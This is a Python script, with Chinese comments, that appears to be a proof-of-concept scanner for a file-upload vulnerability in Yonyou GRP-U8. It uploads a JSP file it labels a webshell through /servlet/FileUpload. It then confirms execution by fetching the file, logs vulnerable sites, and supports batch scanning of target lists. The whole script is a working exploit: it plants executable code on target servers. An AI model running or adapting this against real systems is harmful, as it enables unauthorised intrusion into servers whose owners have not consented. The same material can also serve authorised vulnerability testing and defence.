import sys
import requests
import argparse

# 漏洞检测模块
def checkVuln(url):
    vulnurl = url + "/servlet/FileUpload?fileName=1.jsp&actionID=update"
    okurl = url + "/R9iPortal/upload/1.jsp"
    data = """<% out.println("24k");%>"""  # Webshell

    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
               'Content-Type': 'multipart/form-data; boundary=---------------------------32840991842344344364451981273'
               }
    try:
        response = requests.get(vulnurl, headers=headers, data=data, timeout=5, verify=False)
        if response.status_code == 200:
            if '24k' in requests.get(okurl, headers=headers, timeout=5, verify=False).text:
                print(f"【+】当前网址存在漏洞：{url}")
                with open("vuln.txt", "a+") as f:
                    f.write(okurl + "\n")
            else:
                print("【-】目标网站不存在漏洞...")

        else:
            print("【-】目标网站不存在漏洞...")
    except Exception as e:
        print("【-】目标网址存在网络链接问题...")

# 批量漏洞检测模块
def batchCheck(filename):
    with open(filename, "r") as f:
        for readline in f.readlines():
            checkVuln(readline)

def banner():
    bannerinfo = """
oooooo   oooo oooooo   oooo   .oooooo.    ooooooooo.   ooooooooo.           ooooo     ooo  .ooooo.   
 `888.   .8'   `888.   .8'   d8P'  `Y8b   `888   `Y88. `888   `Y88.         `888'     `8' d88'   `8. 
  `888. .8'     `888. .8'   888            888   .d88'  888   .d88'          888       8  Y88..  .8' 
   `888.8'       `888.8'    888            888ooo88P'   888ooo88P'           888       8   `88888b.  
    `888'         `888'     888     ooooo  888`88b.     888         8888888  888       8  .8'  ``88b 
     888           888      `88.    .88'   888  `88b.   888                  `88.    .8'  `8.   .88P 
    o888o         o888o      `Y8bood8P'   o888o  o888o o888o       xhonger      `YbodP'     `boood8'  """
    print(bannerinfo)
    print("YYGRP-U8".center(100, '*'))
    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")
    print("--author:xhonger 联系方式：01xhonger@gmail.com".rjust(100," "))

# 主程序方法，进行调用
def main():
    parser = argparse.ArgumentParser(description='GRP-U8-UploadFile漏洞单批检测脚本@xhonger')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    args = parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()   # 欢迎信息....

if __name__ == '__main__':
    main()
